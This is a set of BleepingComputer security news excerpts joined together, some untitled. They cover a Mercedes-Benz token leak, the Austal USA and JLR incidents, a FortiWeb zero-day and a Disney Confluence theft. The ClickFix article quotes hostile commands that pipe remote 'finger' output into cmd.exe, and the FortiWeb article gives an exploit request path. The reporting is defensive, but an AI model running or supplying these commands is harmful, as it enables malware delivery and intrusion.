revoked the respective token and removed the public repository immediately. Customer data was not affected as our current analysis shows. We will continue to analyse this case according to our normal processes. - Mercedes-Benz The automaker told BleepingComputer that they do not want to share technical details on the incident for security reasons, so it is unclear if they have detected unauthorized access or not. Also, the firm has said they are open to working with researchers worldwide and accepts security reports through its vulnerability disclosure program . It's budget season!

A mishandled GitHub token exposed Mercedes-Benz source code,https://www.bleepingcomputer.com/news/security/a-mishandled-github-token-exposed-mercedes-benz-source-code/#comment_form,Bill Toulas,"January 30, 2024","A mishandled GitHub token gave unrestricted access to Mercedes-Benz's internal GitHub Enterprise Service, exposing source code to the public. Mercedes-Benz is a prestigious German car, bus, and truck maker recognized for its rich history of innovation, luxurious designs, and top build quality. Like many modern automakers, the brand uses software in its vehicles and services, including safety and control systems, infotainment, autonomous driving, diagnostic and maintenance tools, connectivity and telematics, and electric power and battery management (for EVs). On September 29, 2023, researchers at RedHunt Labs discovered a GitHub token in a public repository belonging to a Mercedez employee that gave access to the company's internal GitHub Enterprise Server. ""The GitHub token gave 'unrestricted' and 'unmonitored' access to the entire source code hosted at the Internal GitHub Enterprise Server,"" reads RedHunt Labs' report . ""The incident laid bare sensitive repositories housing a wealth of intellectual property, and the compromised information included database connection strings, cloud access keys, blueprints, design documents, SSO passwords, API keys, and other critical internal information."" As the researchers explained, the consequences of publicly exposing that data can be severe. Source code leaks can lead to competitors reverse-engineering proprietary technology or hackers scrutinizing it for potential vulnerabilities in vehicle systems. Also, the exposure of API keys could lead to unauthorized data access, service disruption, and abuse of the company's infrastructure for malicious purposes. RedHunt Labs also mentions the possibility of legal violations, such as GDPR infringement, in case the exposed repositories contained customer data. However, the researchers have not validated the contents of the exposed files. RedHunt, with help from TechCrunch , informed Mercedes-Benz of the token leak on January 22, 2024, and revoked it two days later, blocking access to anyone holding and abusing it. This incident resembles a Toyota security mishap from October 2022, when the Japanese automaker revealed that personal customer information remained publicly accessible for five years due to an exposed GitHub access key. These incidents only generate evidence of malicious exploitation if the owners of GitHub Enterprise instances have activated audit logs, which typically include IP addresses. BleepingComputer has contacted Mercedes-Benz to learn if they have seen any signs of unauthorized access on their GitHub server, and we received the following response: We can confirm that source code containing an internal access token was published on a public GitHub repository by human error. This token gave access to a certain number of repositories, but not to the entire source code hosted at the Internal GitHub Enterprise Server. We have revoked the respective token and removed the public repository immediately. Customer data was not affected as our current analysis shows. We will continue to analyse this case according to our normal processes. - Mercedes-Benz The automaker told BleepingComputer that they do not want to share technical details on the incident for security reasons, so it is unclear if they have detected unauthorized access or not. Also, the firm has said they are open to working with researchers worldwide and accepts security reports through its vulnerability disclosure program .

The company is based in Australia and specializes in high-performance aluminum vessels. Its American subsidiary, Austal USA, is under contract for multiple programs that include building Independence class littoral combat ships for the U.S. Navy, which are 127-meter-long vessels at a cost of $360 million per unit. Austal also has an active $3.3 billion contract for building 11 patrol cutters for the U.S. Coast Guard. Earlier today, the Hunters International ransomware and data extortion group claimed to have breached Austal USA and leaked some information as proof of the intrusion. Responding to a request for comment, a spokesperson for the company confirmed the attack to BleepingComputer and said that Austal USA acted quickly to mitigate the incident: Austal USA recently discovered a data incident. We were able to quickly mitigate the incident resulting in no impact on operations. Regulatory authorities, including the Federal Bureau of Investigation (FBI) and Naval Criminal Investigative Service (NCIS) were promptly informed and remain involved in investigating the cause of the situation and the extent of information that was accessed. No personal or classified information was accessed or taken by the threat actor. We are working closely with the appropriate authorities and will continue to inform any stakeholders impacted by the incident as we learn new information. Austal USA recognizes the seriousness of this event and the special responsibility we have as a DoD and DHS contractor.

Decades-old ‘Finger’ protocol abused in ClickFix malware attacks,https://www.bleepingcomputer.com/news/security/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/,Lawrence Abrams,"November 15, 2025","The decades-old ""finger"" command is making a comeback,, with threat actors using the protocol to retrieve remote commands to execute on Windows devices. In the past, people used the finger command to look up information about local and remote users on Unix and Linux systems via the Finger protocol, a command later added to Windows. While still supported, it's rarely used today compared to its popularity decades ago. When executed, the finger command returns basic information about a user, including their login name, name (if set in /etc/passwd), home directory, phone numbers, last seen, and other details. Recently, there have been malicious campaigns utilizing the Finger protocol in what appear to be ClickFix attacks that retrieve commands to execute on devices. This is not the first time the finger command has been abused in this way, as researchers warned in 2020 that it was used as a LOLBIN to download malware and evade detection. Last month, cybersecurity researcher MalwareHunterTeam shared a batch file [ VirusTotal ] with BleepingComputer that, when executed, would use the "" finger root@finger.nateams[.]com "" command to retrieve commands from a remote finger server, which were then run locally by piping them through cmd.exe. While that host is no longer accessible, MalwareHunterTeam found additional malware samples and attacks utilizing the finger command. For example, a person on Reddit recently warned that they fell victim to a ClickFix attack that impersonated a Captcha, prompting them to run a Windows command to verify they were human. ""I just fell for verify you are human win + r. What do I do?,"" reads the Reddit post . ""I was in a rush and fell for this and ended up entering the following in my cmd prompt:"" ""cmd /c start """" /min cmd /c ""finger vke@finger.cloudmega[.]org | cmd"" && echo' Verify you are human--press ENTER'"" Although the host is no longer responding to finger requests, another Reddit user captured the output . This attack abuses the Finger protocol as a remote script delivery method, by running finger vke@finger.cloudmega[.]org and piping its output through the Windows command processor, cmd.exe. This causes the retrieved commands to be executed, which creates a random-named path, copies curl.exe to a random filename, uses the renamed curl executable to download a zip archive disguised as a PDF [ VirusTotal ] from cloudmega[.]org, and extracts a Python malware package. The Python program will then be executed using pythonw.exe __init__.py . The final command executed is a call back to the attacker's server to confirm execution, while displaying a fake ""Verify you are human"" prompt to the user. It is unclear what the purpose of the Python package is, but a related batch file indicates it was an infostealer. MalwareHunterTeam also found a similar campaign that uses "" finger Kove2@api.metrics-strange.com | cmd "" to retrieve and run commands almost identical to the previously mentioned ClickFix attack. BleepingComputer found this to be a more evolved attack, with the commands looking for tools commonly used in malware research and exiting if found. These tools include filemon, regmon, procexp, procexp64, tcpview, tcpview64, Procmon, Procmon64, vmmap, vmmap64, portmon, processlasso, Wireshark, Fiddler, Everywhere, Fiddler, ida, ida64, ImmunityDebugger, WinDump, x64dbg, x32dbg, OllyDbg, and ProcessHacker. If no malware analysis tools are found, the commands will download a zip archive disguised as PDF files and extract it. However, instead of extracting a malicious Python package from the fake PDF, it extracts the NetSupport Manager RAT package. The commands will then configure a scheduled task to launch the remote access malware when the user logs in. While the current 'finger' abuse appears to be carried out by a single threat actor conducting ClickFix attacks, as people continue to fall for them, it is essential to be aware of the campaigns. For Defenders, the best way to block the use of the finger command is to block outgoing traffic to TCP port 79, which is what is used to connect to a daemon over the Finger protocol.

The cyberattack was announced on September 2, 2025 , forcing the British carmaker to shut down production at major plants and send its staff home. A follow-up statement confirmed that data had been stolen during the cyberattack, which was claimed on Telegram by the cybercrime Scattered Lapsus$ Hunters. The disruption continued for weeks , stressing the company's financial and market position and raising risks for it and some of its suppliers, who faced severe liquidity issues. On September 29, 2025, the UK Government intervened to pull JLR out of its dire position, approving a £1.5 billion loan guarantee to help restore its supply chain and quickly restart production. Production restarted by October 8, 2025, following a phased approach. Based on the financial results JLR has now published, the cyberattack, which halted production and disrupted sales, also created a significant dent in its profits. ""Loss before tax and exceptional items was £(485)m for Q2 and £(134)m for H1, down from a profit of £398m and £1.1bn respectively a year ago,"" stated the company . ""EBIT margin was (8.6)% for the second quarter, down from 5.1% a year ago, and (1.4)% for H1, down from 7.1% in H1 last year."" ""This decrease in profitability is largely due to the cyber incident, the continuing impact of US tariffs, reduced volumes as referenced above and increased VME."" In its Monetary Policy Report published earlier this week, the Bank of England declared that the country's GDP was weaker than expected in Q3 2025, mentioning the cyberattack at Jaguar Land Rover as one of the key reasons. Despite all that, JLR states that its operations have now stabilized, with wholesale, parts logistics, and supplier financing now fully restored. The company also highlighted that investment spending has not been cut despite the disruptions, and it is expected to remain at £18 billion over the five years from FY24.

The flaw was silently patched after reports that unauthenticated attackers were exploiting an unknown FortiWeb path traversal flaw in early October to create new administrative users on Internet-exposed devices. The attacks were first identified by threat intel firm Defused on October 6, which published a proof-of-concept exploit and reported that an ""unknown Fortinet exploit (possibly a CVE-2022-40684 variant)"" is being used to send HTTP POST requests to the /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi Fortinet endpoint to create local admin-level accounts. On Thursday, watchTowr Labs security researchers also demoed an exploit and released a tool called "" FortiWeb Authentication Bypass Artifact Generator to help defenders identify vulnerable devices. Cybersecurity firm Rapid7 added that the flaw affects FortiWeb versions 8.0.1 and earlier, as it confirmed that the publicly available proof-of-concept exploit no longer works after updating to version 8.0.2. Today, Fortinet disclosed that attackers are actively exploiting a path confusion vulnerability (now tracked as CVE-2025-64446) in FortiWeb's GUI component, which allows unauthenticated attackers to execute administrative commands on unpatched systems via crafted HTTP or HTTPS requests. ""Fortinet has observed this to be exploited in the wild,"" the company noted in a Friday security advisory , which confirms that the zero-day has been patched in FortiWeb 8.0.2, released on October 28, three weeks after the first report of CVE-2025-64446 active exploitation. CISA also added the CVE-2025-64446 path traversal flaw to its catalog of actively exploited vulnerabilities on Friday, ordering U.S. federal agencies to patch their systems by November 21 . ""This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise,"" the cybersecurity agency warned. Admins who can't immediately upgrade to FortiWeb 8.0.2 should disable HTTP or HTTPS for all internet-facing management interfaces and ensure that access is restricted to trusted networks. Fortinet also advised customers to check their configuration and review logs for new unauthorized administrator accounts and other unexpected modifications. BleepingComputer contacted Fortinet with questions about these ongoing attacks, but we have yet to receive a response. In August, Fortinet patched a critical command injection flaw (CVE-2025-25256) with publicly available exploit code in its FortiSIEM security monitoring solution, one day after cybersecurity company GreyNoise warned of a massive spike in brute-force attacks targeting Fortinet SSL VPNs .

Club Penguin was a multiplayer online game (MMO) from 2005 to 2018, featuring a virtual world where players could engage in games, activities, and chat with other players. The game was originally created by New Horizon Interactive, which Disney later purchased. While Club Penguin was officially shut down in 2017, and its successor, Club Penguin Island, in 2018, the game continues to live on in private servers run by fans and independent developers. Though Disney pushed back on a more prominent 'Club Penguin Rewritten' remake, causing its operators to be arrested , private servers continue to this day with thousands of players. This week, an anonymous person uploaded a link to ""Internal Club Penguin PDFs"" on the 4Chan message board with the simple statement, ""I no longer need these :)."" The link goes to a 415 MB archive containing 137 PDFs that contain old internal information about Club Penguin, including emails, design schematics, documentation, and character sheets. All of this data is seven years old, if not older, making it only interesting to fans of the game. BleepingComputer has since learned that Club Penguin data is only a small part of a much larger data set stolen from Disney's Confluence server, which stores documentation for various business, software, and IT projects used internally by Disney. According to an anonymous source, Disney's Confluence servers were breached using previously exposed credentials. The source says that the threat actors were initially looking for Club Penguin data; they wound up downloading 2.5 GB of data about Disney's corporate strategies, advertising plans, Disney+, internal developer tools, business projects, and internal infrastructure. ""Lot more files here including internal api endpoints and credentials for things like S3 buckets,"" an anonymous source told BleepingComputer. The data, seen by BleepingComputer, includes documentation on a wide variety of initiatives and projects, as well as information on internal developer tools named Helios and Communicore, which have not previously been disclosed publicly. CommuniCore is a ""high-performance asynchronous messaging library, aimed at use in distributed applications."" Helios is a show authoring and playback tool that allows Disney producers and authors to create interactive non-linear ""experiences"" using real world inputs from sensors in Disney's parks. Strewn across the documents are links to internal websites used by Disney developers, which could be valuable for threat actors who wish to target the company. While the Club Penguin data is fairly old, the rest of the data circulating on Discord is far newer, with information from 2024. BleepingComputer was told that the original Club Penguin PDFs shared on 4Chan were stolen weeks ago.
